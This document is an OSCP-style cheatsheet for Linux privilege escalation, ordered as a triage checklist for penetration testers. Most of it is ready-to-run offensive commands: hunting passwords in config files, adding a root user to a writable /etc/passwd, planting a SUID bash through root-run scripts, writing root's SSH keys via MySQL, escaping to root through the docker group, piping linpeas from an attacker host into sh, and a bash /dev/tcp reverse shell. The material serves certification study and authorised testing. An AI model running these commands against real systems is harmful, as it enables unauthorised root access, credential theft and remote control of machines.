# Linux Privilege Escalation — OSCP Cheatsheet

A triage-ordered checklist: quick wins first, deeper enumeration after.
Work top to bottom. The highest-value checks are at the top for a reason.

> **Triage principle:** chase the highest-signal lead first — something that is
> (1) **anomalous** (not a stock file/config), (2) **writable by you**, and
> (3) **executed by root**. A lead scoring on all three beats breadth-first poking.

---

## 0. Orient — who am I, where am I

```bash
id                      # uid, gid, GROUPS (docker/lxd/adm/disk/sudo = paths to root)
whoami
hostname
cat /etc/os-release     # distro + version (kernel exploit relevance)
uname -a                # kernel version
cat /etc/passwd | grep -vE 'nologin|false'   # real-shell users = who to target
ls -la ~ ; cat ~/.bash_history 2>/dev/null   # creds, commands, hints
pwd
```

---

## 1. Sudo — the #1 check

```bash
sudo -l                 # prompts for YOUR password
sudo -n -l              # non-interactive: shows NOPASSWD rules WITHOUT a password
sudo -V                 # sudo version (check for CVEs, e.g. Baron Samedit)
```

- Any `NOPASSWD` entry → look it up on **GTFOBins** (`sudo` section).
- `(ALL : ALL) ALL` with a known password → `sudo su -`.
- Even a single allowed binary (vi, less, find, awk, python, tar, systemctl…) is usually root via GTFOBins.
- Old sudo (<1.8.28) → `CVE-2019-14287` (`sudo -u#-1`). Sudo 1.8.2–1.9.5p1 → `CVE-2021-3156` (Baron Samedit).

---

## 2. SUID / SGID / Capabilities

```bash
find / -perm -4000 -type f 2>/dev/null        # SUID
find / -perm -2000 -type f 2>/dev/null         # SGID
getcap -r / 2>/dev/null                          # capabilities (cap_setuid = instant root)
```

- Compare every result against **GTFOBins** (filter: SUID). Ignore the standard set
  (`passwd`, `su`, `mount`, `sudo`, `pkexec`, `chsh`, `chfn`, `newgrp`, `gpasswd`…).
- **Anything non-standard** (custom binary, odd path like `/usr/local/`, backup tool) = investigate.
- `cap_setuid+ep` on python/perl/php → direct root shell.
- `pkexec` present → check for **CVE-2021-4034 (PwnKit)**.

```bash
# capability example
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'   # if cap_setuid
```

---

## 3. Credential Hunting

```bash
# config files with passwords
grep -rliE 'password|passwd|secret|api_key|token' /etc /var/www /opt /home 2>/dev/null | head -40
grep -riE 'AMPDBPASS|DB_PASSWORD|dbpass' /etc /var/www 2>/dev/null

# app config files (web roots especially)
cat /var/www/**/config.php wp-config.php .env 2>/dev/null

# history & keys
cat ~/.bash_history /home/*/.bash_history 2>/dev/null
find / -name 'id_rsa' -o -name 'id_ed25519' -o -name 'authorized_keys' 2>/dev/null
cat ~/.my.cnf ~/.pgpass 2>/dev/null

# mysql user hashes (if you get a privileged DB login)
mysql -u <user> -p'<pass>' -e "SELECT user,host,password FROM mysql.user;" 2>/dev/null
```

- **Credential reuse is king.** Test every found password against `su - <user>` and SSH for root + all real-shell users.
- DB password / app admin password very often == a system user's password.

---

## 4. Scheduled Tasks — cron, incron, systemd timers

### Cron
```bash
cat /etc/crontab
ls -la /etc/cron.* /etc/cron.d/
cat /etc/cron.d/* 2>/dev/null
cat /var/spool/cron/crontabs/* /var/spool/cron/* 2>/dev/null
crontab -l
```
Look for: a root job calling a **writable** script, a **wildcard** (`tar *`, `rsync *`), or a **relative PATH**.

### incron
```bash
cat /etc/incron.d/* 2>/dev/null
incrontab -l 2>/dev/null
ps aux | grep incrond        # runs as root?
```
`incrond` watches files for events (`IN_CLOSE_WRITE`, `IN_MODIFY`) and runs a command as root.
If a watched file is **writable** and the triggered command includes/sources something you control → root.

### systemd timers
```bash
systemctl list-timers --all
```
Then inspect any non-stock timer's `.service` ExecStart for a writable target.

### Watch it live — pspy (no root needed)
```bash
# serve pspy64 from attacker: python3 -m http.server 8000
curl http://<LHOST>:8000/pspy64 -o /tmp/pspy && chmod +x /tmp/pspy && /tmp/pspy
```
Catches cron jobs, root processes, and scripts firing in real time — shows the exact command + interval.

---

## 5. Writable Files a Root Process Uses

```bash
# writable files, trimmed of noise
find / -writable -type f 2>/dev/null | grep -vE '^/proc|^/sys|^/dev|/tmp|/var/log|/run|/home/<you>'

# writable dirs
find / -writable -type d 2>/dev/null | grep -vE '^/proc|^/sys|^/dev|/tmp|/run'

# files/dirs you own outside home
find / -user $(whoami) 2>/dev/null | grep -vE '^/proc|^/sys|/home/<you>' | head -40
find / -group $(id -gn) 2>/dev/null | grep -vE '^/proc|^/sys' | head -40
```

Check these high-value writables specifically:
```bash
ls -la /etc/passwd /etc/shadow /etc/sudoers /etc/sudoers.d/*
ls -ld /etc/profile.d/ ; ls -la /etc/profile.d/     # scripts sourced on every login shell
ls -la /etc/ld.so.conf.d/
```

- **Writable `/etc/passwd`** → add a root user:
  ```bash
  openssl passwd -1 -salt x pass123           # generate hash
  echo 'root2:<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd
  su root2
  ```
- **Writable script run by root (cron/incron/service)** → append a payload:
  ```bash
  echo 'cp /bin/bash /tmp/rb; chmod 4755 /tmp/rb' >> /path/to/script
  # wait for trigger, then:
  /tmp/rb -p
  ```
- **Writable file that a root PHP/python/bash process `include`s/sources** → drop code there (Connected pattern).

---

## 6. Services, Processes, Internal Ports

```bash
ps aux --forest              # root processes, esp. running writable scripts
ps aux | grep -E 'root' | grep -vE '\[' | head -40
ss -tulpn                    # or netstat -tulpn — localhost-only services
```
- A service bound to `127.0.0.1` that wasn't reachable externally = pivot target (DB, admin panel, internal API).
- Forward it: `ssh -N -L <lport>:127.0.0.1:<rport> user@target`.
- Root process running a script you can write = direct win.

**mysqld running as root?**
```bash
ps aux | grep mysqld         # if UID=root AND you have a privileged DB login:
# INTO OUTFILE writes files as root:
mysql -u root -e "SELECT 'ssh-rsa AAAA...' INTO OUTFILE '/root/.ssh/authorized_keys';"
mysql -e "SELECT @@secure_file_priv;"   # empty = OUTFILE anywhere
```

---

## 7. Group-Based Escalation

```bash
id      # check groups
```
| Group | Path to root |
|-------|--------------|
| `docker` | `docker run -v /:/mnt -it alpine chroot /mnt sh` |
| `lxd` / `lxc` | mount host fs via privileged container |
| `disk` | `debugfs /dev/sda1` → read/write any file (shadow, keys) |
| `adm` | read logs (`/var/log`) — creds, recon |
| `sudo` / `wheel` | you have sudo rights — see §1 |
| `video` / `shadow` | read sensitive files |

---

## 8. NFS / Mounts

```bash
cat /etc/exports 2>/dev/null
showmount -e <target>        # from attacker
mount ; cat /etc/fstab
```
- `no_root_squash` export → mount it from attacker, drop a SUID root binary into it.

---

## 9. Kernel Exploits — LAST resort

```bash
uname -a
cat /etc/os-release
# searchsploit linux kernel <version>
```
- Noisy, can crash the box — try everything above first.
- Known high-value: **DirtyPipe** (5.8–5.16.11, CVE-2022-0847), **DirtyCow** (<4.8.3, CVE-2016-5195), **PwnKit** (pkexec, CVE-2021-4034), **Baron Samedit** (sudo, CVE-2021-3156).
- `pkexec`/PwnKit works on an enormous range and is low-risk — worth trying early as an exception.

---

## 10. Automated Enumeration (run early, read while you manually check)

```bash
# LinPEAS — the all-in-one
curl http://<LHOST>:8000/linpeas.sh | sh
# or: ./linpeas.sh -a | tee linpeas.txt

# linux-exploit-suggester (kernel CVE matching)
./les.sh

# pspy — process/cron watcher (see §4)
./pspy64
```
Don't let LinPEAS *replace* thinking — use it to confirm/expand your manual triage. Red/yellow highlights = look there first.

---

## Quick Decision Flow

```
foothold shell
   │
   ├─ sudo -l / sudo -n -l ........... NOPASSWD? → GTFOBins → root
   ├─ SUID / getcap ................... non-standard binary? → GTFOBins → root
   ├─ creds in configs/history ........ reuse vs su/ssh for all users + root
   ├─ cron / incron / timers .......... writable script or include run by root?
   ├─ writable root-used files ........ /etc/passwd, profile.d, sourced files
   ├─ internal services / groups ...... docker/lxd/disk, localhost pivots
   └─ kernel / pkexec ................. last resort (PwnKit = low-risk exception)
```

---

## Extra Notes
- **"Vulnerable" ≠ "this exploit lands."** If a PoC fails, diagnose *which stage* broke (wrong path, version drift in the delivery step, payload can't call back) rather than assuming the target is patched.
- **Read a PoC before running it.** Know the endpoint it hits and what it expects — 2 min reading saves 20 min debugging.
- **Start your listener before firing.** `nc -lvnp <port>`.
- **Prefer a proof payload first** (`id` → a file) before a reverse shell, so you separate "did root run my code" from "did my shell catch."
- Reverse shell that survives quoting: write with a quoted heredoc.
  ```bash
  cat > payload <<'EOF'
  bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1
  EOF
  ```
```
```
